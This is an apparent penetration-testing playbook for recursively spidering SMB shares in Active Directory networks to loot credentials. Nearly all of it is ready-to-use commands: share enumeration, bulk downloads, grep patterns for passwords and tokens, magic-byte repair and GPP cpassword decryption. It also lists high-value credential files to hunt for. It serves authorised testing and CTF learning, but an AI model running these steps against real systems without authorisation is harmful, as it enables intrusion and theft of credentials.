# SMB Share Spidering and Credential Looting

## When this applies

- You have any authenticated SMB access (null, guest, valid user, or compromised account).
- Goal is to recursively walk every readable share for credentials, configs, scripts, and sensitive data.
- High-yield post-exploitation step in AD environments — internal IT scripts routinely contain plaintext passwords.

## Technique

Enumerate readable shares, then recursively download or grep file contents for credential patterns. Files with mangled magic bytes (deliberate obfuscation) need byte-patching before analysis. Office documents (xlsx/docx) are ZIP files — extract `xl/sharedStrings.xml` directly to dump every string without opening Excel.

## Steps

### 1. Enumerate shares

```bash
# All readable shares for current user
smbclient -L //TARGET -U user%pass
nxc smb TARGET -u user -p pass --shares

# Map permissions per share
smbmap -H TARGET -u user -p pass
```

`smbmap` annotates each share with `READ ONLY`, `READ, WRITE`, or `NO ACCESS`.

### 2. Recursive listing / download

```bash
# Recursive list
smbmap -H TARGET -u user -p pass -R SHARENAME

# Download all files from a share
smbclient //TARGET/SHARENAME -U user%pass -c 'prompt; recurse; mget *'

# Or with smbget (full URL)
smbget -R smb://user:pass@TARGET/SHARENAME

# nxc spider with regex pattern
nxc smb TARGET -u user -p pass --spider SHARENAME --pattern '.'
```

### 3. Credential pattern grep

After download, hunt for credentials in scripts and configs:

```bash
# Common patterns in PowerShell scripts
grep -rEi 'ConvertTo-SecureString|PSCredential|password\s*=' loot/

# Connection strings
grep -rEi 'connectionString|Data Source=|Server=.*Password=' loot/

# Generic password hunts
grep -rEi 'pass(word)?[\s]*[:=]|pwd|secret|token|api[_-]?key' loot/
```

Scripts often contain hardcoded credentials in `ConvertTo-SecureString -AsPlainText -Force` form, plaintext `$cred = "user:pass"`, or `.config` connection strings.

### 4. File-format obfuscation on shares

CTF/AD shares often hide credentials inside files whose magic bytes have been deliberately mangled so a casual `file` / extension scan looks "innocent". Always verify the magic bytes on every interesting download — extension is not authoritative.

Common tampered formats:

- **xlsx/docx/pptx (Office 2007+ ZIP)**: real header `50 4B 03 04` (`PK\x03\x04`). If `file` reports `data` or `Zip archive (non-standard signature)` and the first two bytes are anything other than `PK` (e.g. `PH`, `XX`, `ZZ`), patch the first 2 bytes back to `PK` and the file opens normally — strings in `xl/sharedStrings.xml` frequently contain plaintext credentials.
- **ZIP/JAR/APK** (`PK\x03\x04`), **PNG** (`89 50 4E 47`), **PDF** (`%PDF`), **PE/EXE** (`MZ`) — same pattern: byte-flipped magic = trivially reversible obfuscation.

```bash
# One-liner to detect + fix Office magic mangling
xxd -l 4 file.xlsx                       # check first 4 bytes
printf '\x50\x4B' | dd of=file.xlsx bs=1 count=2 conv=notrunc   # patch back to "PK"
unzip -p file.xlsx xl/sharedStrings.xml  # plaintext strings (creds often live here)
```

### 5. High-value file types to grep for cleartext creds

- `*.kdbx`, `*.kdb` (KeePass DBs — try empty + reuse + recovered passphrase)
- `unattend.xml`, `sysprep.xml`, `Autounattend.xml` (Windows install creds)
- `web.config`, `appsettings.json`, `connectionStrings.config`
- `*.ini`, `*Configuration*.ini`, `*Setup*.ini` (SQL Server / IIS / app installers)
- `*.bak`, `*.old`, `*.orig`, `*.backup` next to active config files
- `*.ps1`, `*.bat`, `*.cmd`, `*.vbs` (admin scripts)
- `*.kdb`, `*.lastpass`, `*.psafe3` (password databases)
- `id_rsa`, `id_ecdsa`, `*.ppk` (SSH keys)
- `*.pfx`, `*.p12` (certs with private keys)
- `Group Policy Preferences` XMLs (cpassword field — AES key is public)

### 6. Group Policy Preferences (GPP) password decryption

```bash
# Hunt in SYSVOL for cpassword XML
find loot/SYSVOL -iname '*.xml' -exec grep -l 'cpassword' {} \;

# Decrypt with gpp-decrypt (Kali) or python
gpp-decrypt 'cpassword_value'
```

The AES key for cpassword is public (Microsoft published it in MS14-025) — every cpassword is recoverable.

### 7. PowerShell history / RDP history

After domain-user foothold, mounted home directories on file shares often contain:
- `Users/<user>/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt`
- `Users/<user>/Documents/Default.rdp`
- Saved credentials in PuTTY (`HKCU\Software\SimonTatham\PuTTY\Sessions`)

## Verifying success

- Download archive saved (`loot/SHARENAME/...`)
- Credential pattern grep produces hits (passwords, secrets, tokens)
- Identified files re-tested against other services (SSH, RDP, web logins) — credential reuse is the norm

## Common pitfalls

- **`smbclient mget` defaults to non-recursive** — must run `recurse; prompt;` first.
- **Permission errors mid-walk** — `smbmap -R` continues past denied directories; smbclient stops. Use `smbmap` for noisy enumeration.
- **`--spider` regex** — `'.'` matches every file; tighten with `'\.(ps1|bat|xml|ini|config)$'` for targeted pulls.
- **Large downloads consume disk** — limit to specific extensions or use `smbmap` first to triage.
- **DFS / namespace shares** look like one share but redirect to multiple servers — recursive listing may hit different boxes; mark each.
- **Obfuscated Office files** look broken in `file` — always check first 4 bytes with `xxd -l 4`.
- **`net view \\TARGET`** from Windows shows shares without authenticating prompt — useful when running on a domain-joined box.

## Tools

- smbclient (samba client)
- smbmap (recursive listing + permission map)
- netexec / crackmapexec (`--spider`, `--shares`)
- impacket-smbclient.py (Python alternative)
- gpp-decrypt (Kali) or `python -c "from Crypto.Cipher import AES..."` for cpassword
- xxd, dd, unzip (file format forensics)
- grep, ripgrep (recursive credential hunting)
